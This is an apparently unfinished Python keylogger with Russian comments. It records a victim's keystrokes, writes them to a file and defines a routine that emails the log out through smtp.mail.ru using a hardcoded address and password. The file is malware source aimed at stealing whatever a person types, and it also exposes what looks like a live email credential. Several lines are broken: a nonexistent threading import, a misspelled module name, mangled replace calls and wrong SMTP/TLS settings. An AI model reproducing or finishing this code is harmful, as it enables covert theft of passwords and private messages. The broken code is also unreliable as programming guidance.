"""
1 юзер вводит текст, он записывается в программу
через какое-то время он отправляется мне на почту

1) найти средство обработки нажатий  - pip install keyboard
2) запись в файл через with as
3) найти способ, чтобы отправлять данные на мейл - SMTP, pip install smtplib
4) threading -> timer модуль для выполнения чего-то через заданное время """
import smtplib
from threading import timing
import sntplib
from datetime import datetime
import keyboard

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "shibanovivanxai@mail.ru"
EMAIL_PASSWORD = "lFTyY2QLkX"

class KeyLogger:

    def __init__(self, interval, report_method):
        self.interval = interval
        self.report_method = report_method
        self.log = "" # сюда будут записаны логи
        self.start_date = datetime.now() # начало записи
        self.end_date = datetime.now() # конец записи

    def callback(self, event): # дописать обработку SHIFT
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name(f'[{name.upper()}]')

        self.log += name

    def update_filename(self):
        # создать имя файла, которое будет состоять из даты и времени начала и окончания записи
        start_dt_str = str(self.start_date)[:7].replace((" ","-").replace(":", ""))
        end_dt_str = str(self.end_date)[:7].replace((" ","-").replace(":", ""))
        self.filename = f"keylog - {start_dt_str}_{end_dt_str}" # название файла для записи создаем

    def report_to_file(self):
        with open (f"{self.filename}", "w", encoding='utf-8') as f:
            print(self.log, file = f)
        print(f"[+] SAVED {self.filename}.txt")

    def sendmail(self, email,password, message):

        server = smtplib.SMTP(host="smtp.mail.ru", port=465)
        # подключаемся в режиме TLS
        server.starttls()
        # авторизация
        server.login(email, password)
        # отправка
        server.sendmail(email,email, message)
        server.quit()


